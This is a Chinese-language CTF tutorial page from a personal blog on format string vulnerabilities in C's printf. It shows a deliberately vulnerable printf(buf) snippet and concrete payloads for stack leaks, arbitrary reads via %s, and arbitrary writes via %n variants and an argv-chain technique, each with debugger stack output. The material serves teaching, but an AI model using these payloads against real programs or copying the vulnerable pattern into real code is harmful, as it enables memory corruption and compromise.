<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    
    
    <link rel="shortcut icon" href="../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Format String - frozenkp's Blog</title>
    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../js/jquery-3.2.1.min.js"></script>
    <script src="../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Format String", url: "#_top", children: [
              {title: "printf \u53c3\u6578", url: "#printf" },
              {title: "\u8b80\u53d6", url: "#_2" },
              {title: "\u5beb\u5165", url: "#_3" },
              {title: "_printf_chk", url: "#_printf_chk" },
          ]},
        ];

    </script>
    <script src="../../js/base.js"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../reverse/radare2/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../reverse/radare2/" class="btn btn-xs btn-link">
        radare2
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../stack_migration/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../stack_migration/" class="btn btn-xs btn-link">
        Stack Migration
      </a>
    </div>
    
  </div>

    

    <h1 id="format-string">Format String</h1>
<p>format string 是在使用 printf 上的一個漏洞，基本上好像只會在打題目的時候出現 XD</p>
<p>以下是經典的 format string 範例</p>
<div class="highlight"><pre><span></span><code><span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
<span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
</code></pre></div>
<p>原本應該由開發者填寫的 format 變成使用者可控的，可以藉由這樣的漏洞達到任意讀取及任意寫入的操作</p>
<h2 id="printf">printf 參數</h2>
<p>一開始要先講的是 <code>printf</code> 的參數，在 <code>amd64</code> 的情況下，如果參數沒有超過 6 個的話會放在 register 上，第 7 個開始才放在 stack 上</p>
<p><code>rdi</code>→<code>rsi</code> → <code>rdx</code> → <code>rcx</code> → <code>r8</code> → <code>r9</code> → <code>stack</code></p>
<p>正常使用 <code>printf</code> 時：</p>
<div class="highlight"><pre><span></span><code><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%d%c%s&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span>  <span class="n">b</span><span class="p">,</span>  <span class="n">c</span><span class="p">);</span>
          <span class="o">|</span>      <span class="o">|</span>   <span class="o">|</span>   <span class="o">|</span>
         <span class="n">rdi</span>    <span class="n">rsi</span> <span class="n">rdx</span> <span class="n">rcx</span>
</code></pre></div>
<p>在使用 fromat string 時，<code>rdi</code> 是自己的 payload，而第一個 <code>%</code> 代表的是 <code>rsi</code>，如果想要動到 stack 上的東西就要從第 6 個 <code>%</code> 開始</p>
<h3 id="_1">直接指定參數</h3>
<p>可以使用 <code>%x$y</code> 直接指定第幾個參數，這邊的 <code>x</code> 是第幾個參數，<code>y</code> 則是要使用的方法</p>
<div class="highlight"><pre><span></span><code><span class="o">%</span><span class="mi">2</span><span class="err">$</span><span class="n">p</span>          <span class="c1">// 印出 rdx (第 2 個參數)</span>
<span class="o">%</span><span class="mi">3</span><span class="err">$</span><span class="n">n</span>          <span class="c1">// 寫入 rcx (第 3 個參數)</span>
</code></pre></div>
<h2 id="_2">讀取</h2>
<p>讀取的部分主要可以有 <code>%p</code> 以及 <code>%s</code> 兩種做法，<code>%p</code> 可以用來讀取 register 以及 stack 上的值，而 <code>%s</code> 則可以做到任意讀取</p>
<h3 id="p">%p</h3>
<p>在讀取時使用的是 <code>%p</code> ，可以用 16 進位印出某個 register (stack 某位置) 存的值，以下來個範例</p>
<p><img alt="" src="https://i.imgur.com/COSz0S8.png" /></p>
<p>這邊輸入的 payload 是</p>
<div class="highlight"><pre><span></span><code>%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
</code></pre></div>
<p>輸出如下</p>
<div class="highlight"><pre><span></span><code>0x1,0x7ffff7dd3790,0xa,(nil),0x7ffff7fe9700,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x400070,0x7fffffffe940,0x7b74f8be5cadfe00,0x4006f0
 |         |        |    |         |               |                   |                   |                 |      
rsi       rdx      rcx  r8        r9              rsp              rsp + 0x8           rsp + 0x10        rsp + 0x18
</code></pre></div>
<p>假設想要印出 <code>rsp + 0x28</code> 的值也可以直接使用 <code>$</code> 來指定</p>
<div class="highlight"><pre><span></span><code>%10$p -&gt; 0x400070
</code></pre></div>
<h3 id="s">%s</h3>
<p><code>%s</code> 跟 <code>%p</code> 讀取的目標不一樣，<code>%s</code> 是把存的值當成指標去讀取，而 <code>%p</code> 是把存的值直接送出來</p>
<p>在正常使用 <code>%s</code> 時，放入的參數是某個字串的指標，<code>printf</code> 會把指標所指的地方當成字串印出</p>
<div class="highlight"><pre><span></span><code><span class="kt">char</span> <span class="n">str</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&quot;Hello World!&quot;</span><span class="p">;</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>               <span class="c1">// Hello World!</span>
</code></pre></div>
<p>這種機制就可以用來任意讀取，假設輸入的 payload 在 stack 上的話，可以把想要印出的位址寫在 payload 上，接著使用 <code>%s</code> 去讀出來，以下是範例</p>
<p><img alt="" src="https://i.imgur.com/5Kp4CMK.png" /></p>
<p>這時候的輸入如下，<code>aaaa</code> 的部分是為了把要印的位址推到 <code>rsp + 0x8</code> ，這樣 <code>rsp + 0x8</code> 就會剛好是 <code>0x6262626262626262</code> ("bbbbbbbb")</p>
<div class="highlight"><pre><span></span><code>%7$saaaabbbbbbbb
</code></pre></div>
<p>在執行 <code>printf</code> 時會去抓 <code>0x6262626262626262</code> 所存的值並當成字串印出，不過這次的範例沒有這個位址，所以會失敗</p>
<h2 id="_3">寫入</h2>
<p><code>printf</code> 使用 <code>%n</code> 時可以寫入指定的位置，也可以更近一步使用 argv chain 來達成任意位址寫入</p>
<p><code>%n</code> 跟 <code>%s</code> 類似，一樣是把存的值當成指標，<code>%s</code> 將指標指的位置讀出來，而 <code>%n</code> 則是把數值寫入指標所指的位置</p>
<p>假設 stack 上的 <code>rsp + 0x10</code> 如下，用 <code>%8$n</code> 寫入這格時，實際上會寫到 <code>0x7ffff7fea000</code> </p>
<div class="highlight"><pre><span></span><code><span class="m">0016</span><span class="p">|</span> 0x7fffffffdb88 --&gt; 0x7ffff7fea000 --&gt; 0x7ffff7a0d000 --&gt; 0x3010102464c457f
</code></pre></div>
<p>如果是寫 <code>0xdeadbeef</code> 的話，這段就會變成</p>
<div class="highlight"><pre><span></span><code>0016| 0x7fffffffdb88 --&gt; 0x7ffff7fea000 --&gt; 0x7fffdeadbeef
</code></pre></div>
<h3 id="_4">寫入的值</h3>
<p>寫入的值是在遇到 <code>%n</code> 前總共印了幾個字元</p>
<p>例如 payload 如下，<code>%n</code> 前有 8 個 <code>a</code> ，所以會寫 8 到指定的位置</p>
<div class="highlight"><pre><span></span><code>aaaaaaaa%n
</code></pre></div>
<p>如果有多個 <code>%n</code> 的話就要看前面到底多長</p>
<p>例如 payload 如下，第一個 <code>%n</code> 前有 8 個 <code>a</code> ，會寫 8 到 <code>rsp</code> 指的位置，而第二個 <code>%n</code> 前有 8 個 <code>a</code> 以及 8 個 <code>b</code> ，共 16 字元，所以會寫 16 到 <code>rsp + 8</code> 所指的位置</p>
<div class="highlight"><pre><span></span><code>aaaaaaaa%6$nbbbbbbbb%7$n
</code></pre></div>
<p>不過這樣寫入要打很久，這時候可以用到 <code>%c</code> 來構成 payload</p>
<p>先來看看 <code>%c</code> 的用法，可以直接指定要印出的長度</p>
<div class="highlight"><pre><span></span><code><span class="c1">// input</span>
<span class="kt">char</span> <span class="n">ch</span> <span class="o">=</span> <span class="sc">&#39;a&#39;</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&quot;%3c&quot;</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&quot;%5c&quot;</span><span class="p">);</span>
<span class="c1">// output</span>
<span class="s">&quot;  a&quot;</span>
<span class="s">&quot;    a&quot;</span>
</code></pre></div>
<p>利用 <code>%c</code> 修改一下上面的範例，可以達成一樣的效果</p>
<div class="highlight"><pre><span></span><code>%8c%6$n%8c%7$n
</code></pre></div>
<h3 id="_5">寫入的長度</h3>
<p>上面雖然都用 <code>%n</code> 來舉例，但其實寫入可以指定不同的長度</p>
<table>
<thead>
<tr>
<th align="center">格式</th>
<th align="center">長度 (byte)</th>
</tr>
</thead>
<tbody>
<tr>
<td align="center">%lln</td>
<td align="center">8 bytes</td>
</tr>
<tr>
<td align="center">%n</td>
<td align="center">4 bytes</td>
</tr>
<tr>
<td align="center">%hn</td>
<td align="center">2 bytes</td>
</tr>
<tr>
<td align="center">%hhn</td>
<td align="center">1 byte</td>
</tr>
</tbody>
</table>
<p>以一開始的例子來說</p>
<div class="highlight"><pre><span></span><code><span class="m">0016</span><span class="p">|</span> 0x7fffffffdb88 --&gt; 0x7ffff7fea000 --&gt; 0x7ffff7a0d000 --&gt; 0x3010102464c457f
</code></pre></div>
<p>寫 <code>aaaa%8$lln</code> </p>
<div class="highlight"><pre><span></span><code><span class="m">0016</span><span class="p">|</span> 0x7fffffffdb88 --&gt; 0x7ffff7fea000 --&gt; 0x4
</code></pre></div>
<p>寫 <code>aaaa%8$n</code></p>
<div class="highlight"><pre><span></span><code><span class="m">0016</span><span class="p">|</span> 0x7fffffffdb88 --&gt; 0x7ffff7fea000 --&gt; 0x7fff00000004
</code></pre></div>
<p>寫 <code>aaaa%8$hn</code></p>
<div class="highlight"><pre><span></span><code><span class="m">0016</span><span class="p">|</span> 0x7fffffffdb88 --&gt; 0x7ffff7fea000 --&gt; 0x7ffff7a00004
</code></pre></div>
<p>寫 <code>aaaa%8$hhn</code></p>
<div class="highlight"><pre><span></span><code><span class="m">0016</span><span class="p">|</span> 0x7fffffffdb88 --&gt; 0x7ffff7fea000 --&gt; 0x7ffff7a0d004
</code></pre></div>
<p>一般在使用的時候，通常不會一次寫入整段的資料，例如要寫入 <code>0xdeadbeef</code> 的話，就必須要一次寫 3735928559 個字元，需要跑超久的，因此會配合 argv chain 分成 <code>0xde</code>、<code>0xad</code>、<code>0xbe</code>、<code>0xef</code> 來多次寫入</p>
<h3 id="argv-chain">argv chain</h3>
<p>argv chain 是利用 stack 上的 argv 來達成任意寫入的功能</p>
<p>stack 上都會有一段是 argv 的位置，argv chain 上的兩段位址都在 stack 上且可以控制</p>
<div class="highlight"><pre><span></span><code><span class="m">0000</span><span class="p">|</span> 0x7fffffffe820 --&gt; 0x333231 <span class="o">(</span><span class="s1">&#39;123&#39;</span><span class="o">)</span>
<span class="m">0008</span><span class="p">|</span> 0x7fffffffe828 --&gt; 0x40073d <span class="o">(</span>&lt;__libc_csu_init+77&gt;:    add    rbx,0x1<span class="o">)</span>
<span class="m">0016</span><span class="p">|</span> 0x7fffffffe830 --&gt; 0x0
<span class="m">0024</span><span class="p">|</span> 0x7fffffffe838 --&gt; 0x0
<span class="m">0032</span><span class="p">|</span> 0x7fffffffe840 --&gt; 0x4006f0 <span class="o">(</span>&lt;__libc_csu_init&gt;:   push   r15<span class="o">)</span>
<span class="m">0040</span><span class="p">|</span> 0x7fffffffe848 --&gt; 0x400590 <span class="o">(</span>&lt;_start&gt;:    xor    ebp,ebp<span class="o">)</span>
<span class="m">0048</span><span class="p">|</span> 0x7fffffffe850 --&gt; 0x7fffffffe940 --&gt; 0x1
<span class="m">0056</span><span class="p">|</span> 0x7fffffffe858 --&gt; 0xa0a688c62ba6ff00
<span class="m">0064</span><span class="p">|</span> 0x7fffffffe860 --&gt; 0x4006f0 <span class="o">(</span>&lt;__libc_csu_init&gt;:   push   r15<span class="o">)</span>
<span class="m">0072</span><span class="p">|</span> 0x7fffffffe868 --&gt; 0x7ffff7a2d830 <span class="o">(</span>&lt;__libc_start_main+240&gt;:   mov    edi,eax<span class="o">)</span>
<span class="m">0080</span><span class="p">|</span> 0x7fffffffe870 --&gt; 0x0
+--------------------------------------------------------------------------------------------------------------+
<span class="p">|</span><span class="m">0088</span><span class="p">|</span> 0x7fffffffe878 --&gt; 0x7fffffffe948 --&gt; 0x7fffffffeb80   <span class="o">(</span><span class="s2">&quot;/home/frozenkp/challenge/format/a.out&quot;</span><span class="o">)</span>        <span class="p">|</span>
+--------------------------------------------------------------------------------------------------------------+
<span class="m">0096</span><span class="p">|</span> 0x7fffffffe880 --&gt; 0x1f7ffcca0
<span class="m">0104</span><span class="p">|</span> 0x7fffffffe888 --&gt; 0x400686 <span class="o">(</span>&lt;main&gt;:  push   rbp<span class="o">)</span>
<span class="m">0112</span><span class="p">|</span> 0x7fffffffe890 --&gt; 0x0
<span class="m">0120</span><span class="p">|</span> 0x7fffffffe898 --&gt; 0xc5142c5f7392e1ee
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="m">0088</span><span class="p">|</span> 0x7fffffffe878 --&gt; 0x7fffffffe948 --&gt; 0x7fffffffeb80 --&gt; 0x72662f656d6f682f
              <span class="p">|</span>                  <span class="p">|</span>                  <span class="p">|</span>
          rsp + 0x58         rsp + 0x128        rsp + 0x360
            argv0              argv1              argv2
</code></pre></div>
<p>可以透過寫入 argv1 來改動 argv2 寫的內容 (address)，最後再透過寫入 argv2 來寫入指定的位址</p>
<p>以下範例，假設要在 <code>0xdeadbeef</code> 寫入 <code>0x4</code></p>
<h4 id="argv1-2-bytes">第一步：透過 argv1 寫 2 bytes</h4>
<p>一開始先在 argv2 的值寫上 <code>0xbeef</code> ，payload 如下</p>
<div class="highlight"><pre><span></span><code>%48879c%43$hn
</code></pre></div>
<p>寫完後如下</p>
<div class="highlight"><pre><span></span><code>                                                                             +----+
<span class="m">0088</span><span class="p">|</span> 0x7fffffffe878 --&gt; 0x7fffffffe948 --&gt; 0x7fffffffeb80 --&gt; 0x72662f656d6f<span class="p">|</span>beef<span class="p">|</span>
                                                                             +----+
</code></pre></div>
<h4 id="argv0-2">第二步：透過 argv0 移動 2</h4>
<p>把 argv2 移動 2，payload 如下</p>
<div class="highlight"><pre><span></span><code>%2c%17$hhn
</code></pre></div>
<p>寫完後如下，argv2 從 <code>0x7fffffffeb80</code> 變成 <code>0x7fffffffeb82</code></p>
<div class="highlight"><pre><span></span><code><span class="m">0088</span><span class="p">|</span> 0x7fffffffe878 --&gt; 0x7fffffffe948 --&gt; 0x7fffffffeb82 --&gt; 0x7a6f72662f656d6f
</code></pre></div>
<h4 id="argv1-2-bytes_1">第三步：透過 argv1 寫 2 bytes</h4>
<p>原本只能寫上 <code>0xbeef</code> ，後面的部分透過第二步移動 argv2 以後就可以用 <code>%hn</code> 碰到了</p>
<p>因為剩下只要寫掉 <code>0xdead</code> 就好，所以我這邊直接使用 <code>%lln</code> 把後面都用 0 蓋掉</p>
<div class="highlight"><pre><span></span><code>%57005c%43$lln
</code></pre></div>
<p>寫完後如下</p>
<div class="highlight"><pre><span></span><code>                                                               +------+
<span class="m">0088</span><span class="p">|</span> 0x7fffffffe878 --&gt; 0x7fffffffe948 --&gt; 0x7fffffffeb82 --&gt; <span class="p">|</span>0xdead<span class="p">|</span>
                                                               +------+
</code></pre></div>
<h4 id="argv0">第四步：透過 argv0 移動回來</h4>
<p>把 argv2 移動回來，payload 如下</p>
<div class="highlight"><pre><span></span><code>%17$hhn
</code></pre></div>
<p>寫完後如下，分兩段寫後就可以把整個 <code>0xdeadbeef</code> 寫上去了</p>
<div class="highlight"><pre><span></span><code>                                                               +----------+
<span class="m">0088</span><span class="p">|</span> 0x7fffffffe878 --&gt; 0x7fffffffe948 --&gt; 0x7fffffffeb80 --&gt; <span class="p">|</span>0xdeadbeef<span class="p">|</span>
                                                               +----------+
</code></pre></div>
<h4 id="argv2-0xdeadbeef">第五步：透過 argv2 寫入 0xdeadbeef</h4>
<p>這邊再寫入的時候，如果要寫得值太大，一樣要像前面一樣分成多段來寫，而這個範例只要寫入 <code>0x4</code> 所以就直接寫就好了</p>
<div class="highlight"><pre><span></span><code>%4c%114$lln
</code></pre></div>
<p>寫完後，<code>0xdeadbeef</code> 存的值就會被改掉了</p>
<div class="highlight"><pre><span></span><code><span class="m">0088</span><span class="p">|</span> 0x7fffffffe878 --&gt; 0x7fffffffe948 --&gt; 0x7fffffffeb80 --&gt; 0xdeadbeef --&gt; 0x4
</code></pre></div>
<blockquote>
<p>這題範例為了講解方便，所以一次都寫 2 bytes，建議是一次寫 1 byte 用 for 迴圈自動移動完成即可</p>
</blockquote>
<h2 id="_printf_chk">_printf_chk</h2>
<p>有時候會遇到使用的是 <code>_printf_chk</code> 而非 <code>printf</code>，其實這兩個差不多，只不過 <code>_printf_chk</code> 多了以下限制</p>
<ul>
<li>不能用 <code>%n</code> 系列寫值</li>
<li>不能用 <code>%x$y</code> 指定參數</li>
</ul>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../reverse/radare2/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../reverse/radare2/" class="btn btn-xs btn-link">
        radare2
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../stack_migration/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../stack_migration/" class="btn btn-xs btn-link">
        Stack Migration
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="container-fluid wm-page-content">
      <p>
        <a href="https://github.com/frozenkp/frozenkp.github.io/edit/master/docs/pwn/format_string.md">Edit on frozenkp/frozenkp</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
</footer>

</body>
</html>